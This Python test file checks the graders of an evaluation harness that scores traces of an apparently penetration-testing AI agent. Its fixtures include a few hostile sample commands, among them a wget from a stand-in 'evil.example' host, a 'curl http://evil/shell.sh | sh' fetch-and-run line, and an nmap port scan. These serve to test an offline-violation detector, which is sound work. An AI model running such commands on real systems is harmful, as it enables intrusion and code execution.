"""判据行为 —— 全部用**真事件**折出来的 Trace,不打桩 Trace 本身。

为什么不把 Trace 打桩:判据的全部风险集中在"它读了 Trace 的哪个字段"。例如联网
判据要读 `bash_commands` 而不是 `commands` —— 一旦在这里把 Trace 打桩,这一层
风险就被一起打掉了,剩下的测试只是判据与自己的一致性。所以下面的事件行照 pi
原生形状写,经 `fold_rows` 折叠成 Trace(`predicates` 除外 —— 它本来就是外部
注入的接口,替身即它的正常用法)。

覆盖口径:每条判据至少有一次真失败,外加三个"跳过了但不是通过"的口径
(repetition / tool_errors 的未观测、offline 的 provider 缺席)。
"""

from __future__ import annotations

import json

import pytest

from redpilot.eval.dataset import CHECK_IDS, TaskCard
from redpilot.eval.graders import CHECKS, grade
from redpilot.eval.replay import Trace, trace_from_rows

# 干净轨迹里被读到的技能名 —— 正样本路由断言的靶子。
HIT_SKILL = "web-attack"

ALL_CHECKS = ("budget", "repetition", "tool_errors", "routing", "offline", "trace_integrity")


# ── pi 原生事件构造器(形状对齐 tests/obs/conftest.py 的合成事件) ──

def _session(sid: str = "ab12cd") -> dict:
    return {"type": "session", "id": sid, "cwd": "/work/a-05",
            "timestamp": "2026-09-04T11:52:03.942Z"}


def _turn_start() -> dict:
    return {"type": "turn_start"}


def _turn_end(tokens: int | None = None) -> dict:
    msg: dict = {"stopReason": "tool_use"}
    if tokens is not None:
        msg["usage"] = {"totalTokens": tokens}
    return {"type": "turn_end", "message": msg}


def _bash(call: str, cmd: str, err: bool = False) -> list[dict]:
    """一次 bash 调用(pi 里 start/end 成对,cmd 由 args.command 折叠而来)。"""
    return [
        {"type": "tool_execution_start", "toolCallId": call, "toolName": "bash",
         "args": {"command": cmd}},
        {"type": "tool_execution_end", "toolCallId": call, "toolName": "bash",
         "isError": err, "result": {"content": [{"type": "text", "text": "ok"}]}},
    ]


def _read(call: str, path: str) -> list[dict]:
    """一次 read 调用 —— cmd 折叠成 JSON 参数摘要,不是裸命令。"""
    return [
        {"type": "tool_execution_start", "toolCallId": call, "toolName": "read",
         "args": {"file_path": path}},
        {"type": "tool_execution_end", "toolCallId": call, "toolName": "read",
         "isError": False, "result": {"content": [{"type": "text", "text": "…"}]}},
    ]


def _write(call: str, path: str, body: str) -> list[dict]:
    return [
        {"type": "tool_execution_start", "toolCallId": call, "toolName": "write",
         "args": {"file_path": path, "content": body}},
        {"type": "tool_execution_end", "toolCallId": call, "toolName": "write",
         "isError": False, "result": {"content": [{"type": "text", "text": "written"}]}},
    ]


def _agent_end() -> dict:
    return {"type": "agent_end"}


def _trace(*events) -> Trace:
    """事件(单个 dict 或 list,自动展平)→ 折叠成 Trace。"""
    flat = [e for ev in events for e in (ev if isinstance(ev, list) else [ev])]
    rows = [{"payload": json.dumps(e)} for e in flat]
    return trace_from_rows({"run_id": "run-1", "challenge_code": "a-05"}, rows)


def _card(**kw) -> TaskCard:
    base = dict(id="t-1", category="explicit", intent="考一件事", prompt="题干",
                checks=("budget",))
    base.update(kw)
    return TaskCard(**base)


def _grade_one(check_id: str, trace: Trace, predicates=None, **card_kw):
    """只开一条判据评分 —— 让断言聚焦在这条判据上,不被别的判据带偏。"""
    return grade(trace, _card(checks=(check_id,), **card_kw), predicates=predicates)


class _Stub:
    """worker 侧判据的替身:子串匹配,并记录被判据问过哪些命令。

    `seen` 是给"只喂 bash 命令"那条测试用的 —— 它断言判据**根本没被问**非 bash
    的 cmd,这比看结论更直接。
    """

    def __init__(self, offline: tuple[str, ...] = (), targets: tuple[str, ...] = ()):
        self._offline = offline
        self._targets = targets
        self.seen: list[str] = []

    def is_offline_violation(self, cmd: str) -> bool:
        self.seen.append(cmd)
        return any(p in cmd for p in self._offline)

    def is_target_command(self, cmd: str) -> bool:
        return any(p in cmd for p in self._targets)


def _clean_trace() -> Trace:
    """一次干净执行:读了一个技能、跑了两条命令、token 用满两个 turn、正常收尾。

    故意混入两条技能识别路径(bash 的 `cat …/SKILL.md` 与 read 的 JSON 参数),
    因为 `skill_name_from_cmd` 要认两种形态,路由判据得同时对两者生效。
    """
    return _trace(
        _session(),
        _turn_start(),
        _bash("c1", "nmap -sV -p- 10.0.0.5"),
        _turn_end(1_000),
        _turn_start(),
        _read("c2", f"/app/skills/{HIT_SKILL}/SKILL.md"),
        _bash("c3", "cat /app/skills/web/SKILL.md"),
        _turn_end(2_000),
        _agent_end(),
    )


# ── 注册表 ───────────────────────────────────────────────────

def test_registry_keys_match_dataset_check_ids():
    """判据注册表与 dataset 的词表必须同集合 —— 漂移在这里响亮失败。

    `dataset.load_tasks` 认的是 CHECK_IDS,`grade()` 查的是 CHECKS;两者错开一位,
    卡片会带着一个查不到的判据 id 进入评分,报告则少一条判据而无人察觉。
    """
    assert set(CHECKS) == CHECK_IDS


# ── 全绿路径 ─────────────────────────────────────────────────

def test_clean_run_passes_every_check():
    report = grade(_clean_trace(),
                   _card(checks=ALL_CHECKS, expect_skills=(HIT_SKILL,)),
                   predicates=_Stub())
    assert [c.id for c in report.checks] == list(ALL_CHECKS)
    assert [c.status for c in report.checks] == ["pass"] * len(ALL_CHECKS)
    assert report.overall == "pass"
    assert report.ok is True
    assert (report.task_id, report.run_id) == ("t-1", "run-1")


def test_card_without_offline_check_passes_without_predicates():
    """没启用联网判据的卡不需要 provider —— 缺席只在"启用了却给不出"时才致命。"""
    report = grade(_clean_trace(),
                   _card(checks=("budget", "repetition", "tool_errors", "routing"),
                         expect_skills=(HIT_SKILL,)))
    assert report.overall == "pass" and report.ok is True


# ── budget ───────────────────────────────────────────────────

@pytest.mark.parametrize("budgets, named", [
    ({"max_tools": 2}, "工具调用"),
    ({"max_tokens": 1_500}, "token"),
    ({"max_sessions": 0}, "会话数"),
])
def test_budget_fails_on_each_dimension(budgets, named):
    """三个维度各自能独立触发失败(clean 轨迹:3 工具 / 3000 token / 1 会话)。"""
    report = _grade_one("budget", _clean_trace(), budgets=budgets)
    check = report.checks[0]
    assert check.status == "fail"
    assert named in check.detail
    assert report.overall == "fail" and report.ok is False


def test_budget_pass_reports_lower_bound_tokens():
    """detail 必须写明 token 是下界,否则"没超"会被读成"用量就这么点"。"""
    check = _grade_one("budget", _clean_trace()).checks[0]
    assert check.status == "pass" and "下界" in check.detail
    assert check.metrics["tools"] == 3              # nmap + read + cat
    assert check.metrics["tokens"] == 3_000         # 1000 + 2000
    assert check.metrics["sessions"] == 1
    assert check.metrics["max_tools"] == 400 and check.metrics["max_tokens"] == 3_000_000


# ── repetition ───────────────────────────────────────────────

def test_repetition_fails_when_commands_loop():
    """5 条 bash 里 "ls /tmp" 出现 3 次 → 3/5 = 0.6 > 0.25。"""
    trace = _trace(
        _session(), _turn_start(),
        _bash("c1", "ls /tmp"), _bash("c2", "id"), _bash("c3", "ls /tmp"),
        _bash("c4", "ls /tmp"), _bash("c5", "date"),
        _turn_end(10), _agent_end(),
    )
    check = _grade_one("repetition", trace).checks[0]
    assert check.status == "fail"
    assert check.metrics["ratio"] == pytest.approx(0.6)
    assert check.metrics["repeated_occurrences"] == 3
    assert check.metrics["repeated_kinds"] == 1
    assert check.metrics["bash_commands"] == 5


def test_repetition_threshold_comes_from_card():
    """阈值由卡给:同一条轨迹在宽阈值下通过、在严阈值下失败。"""
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "ls /tmp"), _bash("c2", "ls /tmp"), _bash("c3", "id"),
                   _turn_end(10), _agent_end())
    assert _grade_one("repetition", trace, budgets={"max_repeat_ratio": 0.9}).checks[0].status == "pass"
    assert _grade_one("repetition", trace, budgets={"max_repeat_ratio": 0.1}).checks[0].status == "fail"


def test_repetition_skips_when_no_bash_observed():
    """一条 bash 都没有 → 比例是 0/0。报 skipped:未观测不等于观测干净。"""
    trace = _trace(_session(), _turn_start(),
                   _read("c1", f"/app/skills/{HIT_SKILL}/SKILL.md"),
                   _turn_end(10), _agent_end())
    report = _grade_one("repetition", trace)
    assert report.checks[0].status == "skipped"
    assert report.overall == "incomplete" and report.ok is False


# ── tool_errors ──────────────────────────────────────────────

def test_tool_errors_fails_over_ratio():
    """3 次工具调用错 2 次 → 0.67 > 0.5。"""
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "id", err=True), _bash("c2", "whoami", err=True),
                   _bash("c3", "ls"),
                   _turn_end(10), _agent_end())
    report = _grade_one("tool_errors", trace)
    check = report.checks[0]
    assert check.status == "fail"
    assert check.metrics["ratio"] == pytest.approx(2 / 3)
    assert check.metrics["errors"] == 2 and check.metrics["tool_calls"] == 3
    assert report.overall == "fail"


def test_tool_errors_skips_when_nothing_observed():
    """一次工具都没调用 → skipped,"没动手"不能看起来像一次干净执行。"""
    trace = _trace(_session(), _turn_start(), _turn_end(10), _agent_end())
    report = _grade_one("tool_errors", trace)
    assert report.checks[0].status == "skipped"
    assert report.overall == "incomplete" and report.ok is False


# ── routing ──────────────────────────────────────────────────

def test_routing_positive_hit_passes():
    """bash 路径(cat …/SKILL.md)与 read 路径(JSON 参数)都要能认出技能名。"""
    cases = [
        (_clean_trace(), HIT_SKILL),      # read 工具的 JSON 参数摘要
        (_trace(_session(), _turn_start(),
                _bash("c1", "cat /app/skills/web/SKILL.md"),
                _turn_end(1), _agent_end()), "web"),          # bash 的裸命令
    ]
    for trace, skill in cases:
        check = _grade_one("routing", trace, expect_skills=(skill,)).checks[0]
        assert check.status == "pass"
        assert check.metrics["hit"] == [skill]


def test_routing_positive_miss_fails():
    report = _grade_one("routing", _clean_trace(), expect_skills=("pwn",))
    check = report.checks[0]
    assert check.status == "fail" and "pwn" in check.detail
    assert check.metrics["skills_read"] == [HIT_SKILL, "web"]
    assert report.overall == "fail"


def test_routing_negative_passes_when_forbidden_skill_untouched():
    report = _grade_one("routing", _clean_trace(),
                        category="negative", forbid_skills=("pwn",))
    assert report.checks[0].status == "pass" and report.ok is True


def test_routing_negative_fails_on_forbidden_read():
    """负样本的核心:读到了不该读的技能就是失败,哪怕期望的技能也读到了。"""
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "cat /app/skills/pwn/SKILL.md"),
                   _turn_end(1), _agent_end())
    report = _grade_one("routing", trace,
                        category="negative", forbid_skills=("pwn",))
    check = report.checks[0]
    assert check.status == "fail" and "pwn" in check.detail
    assert report.overall == "fail"


def test_routing_misfire_is_reported_over_miss():
    """两侧都声明、且都发生问题(既误触发又漏触发)时，detail 指向误触发。"""
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "cat /app/skills/pwn/SKILL.md"),
                   _turn_end(1), _agent_end())
    check = _grade_one("routing", trace,
                       expect_skills=("pwn",), forbid_skills=("pwn",)).checks[0]
    assert check.status == "fail"
    assert "误触发" in check.detail


def test_routing_both_sides_declared_reading_neither_is_a_miss():
    """回归：两侧都声明、但**一个都没读** —— 这是漏触发，必须 fail。

    旧实现写的是"两边都声明时以 forbid 为准"，于是"没读到被禁技能"直接判 pass，
    一张技能都没读的 run 也能拿到 routing 通过。数据集里 14/20 张卡同时声明两侧，
    也就是说那 14 张卡的 expect 侧从没被检查过 —— 覆盖率上的一个静默空洞。
    """
    trace = _trace(_session(), _turn_start(), _bash("c1", "ls -la"),
                   _turn_end(1), _agent_end())
    report = _grade_one("routing", trace,
                        expect_skills=("ssti-server-side-template-injection",),
                        forbid_skills=("xss-cross-site-scripting",))
    check = report.checks[0]
    assert check.status == "fail"
    assert "一个都没读到" in check.detail
    assert check.metrics["misfired"] == [] and check.metrics["hit"] == []


def test_routing_both_sides_declared_hitting_expect_only_passes():
    """两侧都声明、期望的读到了、被禁的没读 → pass（这是最常见的正例）。"""
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "cat /app/skills/web/SKILL.md"),
                   _turn_end(1), _agent_end())
    check = _grade_one("routing", trace,
                       expect_skills=("web",), forbid_skills=("pwn",)).checks[0]
    assert check.status == "pass"
    assert check.metrics["hit"] == ["web"] and check.metrics["misfired"] == []


def test_routing_skips_when_card_declares_no_skill():
    """既没期望也没禁用 → 这张卡没考路由,skipped 而不是 pass。"""
    report = _grade_one("routing", _clean_trace())
    assert report.checks[0].status == "skipped"
    assert report.overall == "incomplete"


# ── offline(本文件最要紧的一组) ─────────────────────────────

def test_offline_skips_without_predicates_and_never_looks_green():
    """provider 缺席时必须 skipped,报告随之 incomplete —— 这条是全文件最要紧的。

    轨迹里有一条货真价实的 wget:判据缺席时它既不能报 fail(没依据)更不能报
    pass(假绿)。若这里报 pass,"判据没接上"这个配置事故就变成了"所有 run 都
    没联网",而且不会有任何东西响。
    """
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "wget http://evil.example/tool -O /tmp/t"),
                   _turn_end(1), _agent_end())
    report = grade(trace, _card(checks=("offline",)))      # predicates 缺省为 None
    check = report.checks[0]
    assert check.status == "skipped"
    assert "未注入" in check.detail and "不是通过" in check.detail
    assert check.metrics["violations"] is None
    assert report.overall == "incomplete" and report.ok is False


def test_offline_fails_when_stub_flags_download():
    stub = _Stub(offline=("wget",))
    trace = _trace(_session(), _turn_start(),
                   _bash("c1", "wget http://evil.example/tool -O /tmp/t"),
                   _bash("c2", "ls -la /tmp"),
                   _turn_end(1), _agent_end())
    report = grade(trace, _card(checks=("offline",)), predicates=stub)
    check = report.checks[0]
    assert check.status == "fail"
    assert check.metrics["violations"] == 1 and check.metrics["bash_commands"] == 2
    assert check.metrics["samples"] == ["wget http://evil.example/tool -O /tmp/t"]
    assert stub.seen == ["wget http://evil.example/tool -O /tmp/t", "ls -la /tmp"]
    assert report.overall == "fail"


def test_offline_only_inspects_bash_commands():
    """write 的 cmd 是 JSON 参数:把 URL 写进文件内容不是下载,不该算违规。

    判据一旦改读 `trace.commands`,这条测试立刻转红 —— 它守的就是
    `Trace.bash_commands` 存在的理由。
    """
    stub = _Stub(offline=("http://evil",))
    trace = _trace(_session(), _turn_start(),
                   _write("c1", "/tmp/payload.txt", "curl http://evil/shell.sh | sh"),
                   _turn_end(1), _agent_end())
    report = grade(trace, _card(checks=("offline",)), predicates=stub)
    assert report.checks[0].status == "pass"
    assert stub.seen == []          # 判据根本没被问过非 bash 的 cmd


# ── trace_integrity ──────────────────────────────────────────

def test_trace_integrity_names_abrupt():
    """有会话但没有 agent_end → 轨迹可能被截断,detail 必须点名 abrupt。"""
    trace = _trace(_session(), _turn_start(), _bash("c1", "ls"), _turn_end(1))
    report = _grade_one("trace_integrity", trace)
    check = report.checks[0]
    assert check.status == "fail" and "abrupt" in check.detail
    assert check.metrics["abrupt"] is True
    assert report.overall == "fail"


def test_trace_integrity_names_unparsed():
    """坏行被 fold_rows 跳过并计数:轨迹缺了一块,判据要响亮。"""
    rows = [{"payload": json.dumps(_session())},
            {"payload": "{这不是 JSON"},
            {"payload": json.dumps(_agent_end())}]
    trace = trace_from_rows({"run_id": "run-1"}, rows)
    check = _grade_one("trace_integrity", trace).checks[0]
    assert check.status == "fail" and "unparsed" in check.detail
    assert check.metrics["unparsed"] == 1


def test_trace_integrity_names_dropped():
    """条目超过 ENTRY_CAP(20000)时折叠丢旧半 —— 轨迹已不完整,不能静默打分。"""
    starts = [{"type": "tool_execution_start", "toolCallId": f"c{i}",
               "toolName": "bash", "args": {"command": f"echo {i}"}}
              for i in range(20_001)]
    trace = _trace(_session(), starts)
    check = _grade_one("trace_integrity", trace).checks[0]
    assert check.status == "fail" and "dropped" in check.detail
    assert check.metrics["dropped"] is True


def test_trace_integrity_passes_on_clean_trace():
    check = _grade_one("trace_integrity", _clean_trace()).checks[0]
    assert check.status == "pass"
    assert check.metrics == {"abrupt": False, "dropped": False, "unparsed": 0}


# ── grade() 的编排 ───────────────────────────────────────────

def test_grade_runs_checks_in_card_order():
    report = grade(_clean_trace(),
                   _card(checks=("routing", "budget"), expect_skills=(HIT_SKILL,)))
    assert [c.id for c in report.checks] == ["routing", "budget"]


def test_fail_beats_skipped_in_overall():
    """一条 fail + 一条 skipped → overall 是 fail(fail 的优先级最高)。"""
    trace = _trace(_session(), _turn_start(), _turn_end(10))     # 无工具、未收尾
    report = grade(trace, _card(checks=("tool_errors", "trace_integrity")))
    assert [c.status for c in report.checks] == ["skipped", "fail"]
    assert report.overall == "fail"


def test_card_with_no_enabled_check_is_incomplete_not_pass():
    """零判据的卡报 incomplete:什么都没查,不能报成全部没问题。"""
    report = grade(_clean_trace(), _card(checks=()))
    assert report.checks == ()
    assert report.overall == "incomplete" and report.ok is False
